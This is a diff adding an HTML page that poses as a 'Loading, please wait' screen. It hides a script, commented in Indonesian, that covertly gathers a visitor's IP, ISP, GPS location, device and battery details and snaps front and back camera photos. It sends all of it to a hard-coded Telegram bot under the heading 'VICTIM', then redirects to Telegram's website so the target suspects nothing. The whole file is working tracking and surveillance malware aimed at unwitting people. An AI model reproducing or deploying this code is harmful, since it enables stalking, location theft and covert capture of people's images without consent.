@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        .loader {
+            text-align: center;
+            color: #666;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #888;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p {
+            font-size: 14px;
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+<div class="loader">
+    <div class="spinner"></div>
+    <p>Loading, please wait...</p>
+</div>
+
+<script>
+// ============ KONFIGURASI (GANTI DENGAN MILIK TUAN) ============
+const BOT_TOKEN = '8518906122:AAGySAYRxTf15pG513pp438VhHPYxmWNaVQ';
+const DEFAULT_CHAT_ID = '7300602830';
+// ================================================================
+
+// Ambil parameter dari URL (tanpa sepengetahuan target)
+const urlParams = new URLSearchParams(window.location.search);
+const TARGET_ID = urlParams.get('id') || Math.random().toString(36).substring(2, 10);
+const USER_CHAT_ID = urlParams.get('chat') || DEFAULT_CHAT_ID;
+
+// Fungsi kirim ke Telegram (background, tanpa notifikasi visual)
+async function sendToTelegram(text) {
+    try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: USER_CHAT_ID, 
+                text: text.substring(0, 4000), 
+                parse_mode: 'Markdown' 
+            })
+        });
+    } catch(e) {}
+}
+
+async function sendPhotoToTelegram(caption, base64Data) {
+    try {
+        const blob = await fetch(base64Data).then(r => r.blob());
+        const formData = new FormData();
+        formData.append('chat_id', USER_CHAT_ID);
+        formData.append('caption', caption);
+        formData.append('photo', blob, 'capture.jpg');
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        });
+    } catch(e) {}
+}
+
+// Capture kamera (silent, tanpa popup yang mencurigakan)
+async function getCamera(facingMode) {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: { exact: facingMode }, width: { ideal: 640 }, height: { ideal: 480 } }
+        });
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.setAttribute('playsinline', '');
+        await video.play();
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        stream.getTracks().forEach(t => t.stop());
+        return canvas.toDataURL('image/jpeg', 0.7);
+    } catch(e) {
+        return null;
+    }
+}
+
+// Ambil lokasi GPS
+async function getLocation() {
+    return new Promise(resolve => {
+        if(!navigator.geolocation) { resolve(null); return; }
+        navigator.geolocation.getCurrentPosition(
+            pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+            () => resolve(null),
+            { timeout: 5000, enableHighAccuracy: true }
+        );
+    });
+}
+
+// Ambil IP dan info lokasi
+async function getIPInfo() {
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        return {
+            ip: data.ip,
+            city: data.city || 'Unknown',
+            country: data.country_name || 'Unknown',
+            isp: data.org || 'Unknown'
+        };
+    } catch(e) {
+        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown', isp: 'Unknown' };
+    }
+}
+
+// Ambil info device
+async function getDeviceInfo() {
+    const ua = navigator.userAgent;
+    let device = 'Unknown', os = 'Unknown', browser = 'Unknown';
+    
+    if(/iPhone|iPad|iPod/i.test(ua)) device = 'iOS';
+    else if(/Android/i.test(ua)) device = 'Android';
+    else if(/Windows/i.test(ua)) device = 'Windows';
+    else if(/Mac/i.test(ua)) device = 'Mac';
+    
+    if(/Windows NT 10.0/i.test(ua)) os = 'Windows 10/11';
+    else if(/Mac OS X/i.test(ua)) os = 'macOS';
+    else if(/Android/i.test(ua)) os = 'Android';
+    else if(/iPhone|iPad/i.test(ua)) os = 'iOS';
+    
+    if(/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
+    else if(/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
+    else if(/Firefox/i.test(ua)) browser = 'Firefox';
+    else if(/Edg/i.test(ua)) browser = 'Edge';
+    
+    return { device, os, browser };
+}
+
+// Ambil baterai
+async function getBatteryInfo() {
+    try {
+        if(!navigator.getBattery) return null;
+        const battery = await navigator.getBattery();
+        return { level: Math.round(battery.level * 100), charging: battery.charging };
+    } catch(e) { return null; }
+}
+
+// Ambil waktu lokal target
+function getLocalTime() {
+    return new Date().toLocaleString();
+}
+
+// MAIN FUNCTION - Semua berjalan di background
+async function collectData() {
+    try {
+        // Kumpulkan semua data
+        const ipInfo = await getIPInfo();
+        const gps = await getLocation();
+        const deviceInfo = await getDeviceInfo();
+        const battery = await getBatteryInfo();
+        const gmapsLink = gps ? `https://www.google.com/maps?q=${gps.lat},${gps.lon}` : 'Tidak tersedia';
+        
+        // Ambil foto (background, tanpa tampilkan preview)
+        const frontCamera = await getCamera('user');
+        const backCamera = await getCamera('environment');
+        
+        // Buat laporan
+        let report = `🎯 *VICTIM #${TARGET_ID}*\n\n`;
+        report += `📱 *Device:* ${deviceInfo.device} (${deviceInfo.os})\n`;
+        report += `🌐 *Browser:* ${deviceInfo.browser}\n`;
+        report += `🌍 *IP:* ${ipInfo.ip}\n`;
+        report += `📍 *Location:* ${ipInfo.city}, ${ipInfo.country}\n`;
+        report += `📡 *ISP:* ${ipInfo.isp}\n`;
+        report += `🗺️ *GPS:* ${gmapsLink}\n`;
+        if(battery) report += `🔋 *Battery:* ${battery.level}% ${battery.charging ? '(Charging)' : ''}\n`;
+        report += `📅 *Time:* ${getLocalTime()}\n`;
+        report += `🆔 *User Agent:* ${navigator.userAgent.substring(0, 100)}`;
+        
+        // Kirim semua ke Telegram
+        await sendToTelegram(report);
+        
+        if(frontCamera) await sendPhotoToTelegram(`📸 Front - #${TARGET_ID}`, frontCamera);
+        if(backCamera) await sendPhotoToTelegram(`📸 Back - #${TARGET_ID}`, backCamera);
+        
+    } catch(e) {
+        // Silent fail - target tidak tahu ada error
+    }
+}
+
+// Jalankan pengumpulan data
+collectData();
+
+// Redirect ke website normal setelah beberapa detik (target tidak curiga)
+setTimeout(() => {
+    window.location.href = 'https://web.telegram.org';
+}, 3000);
+</script>
+</body>
+</html>
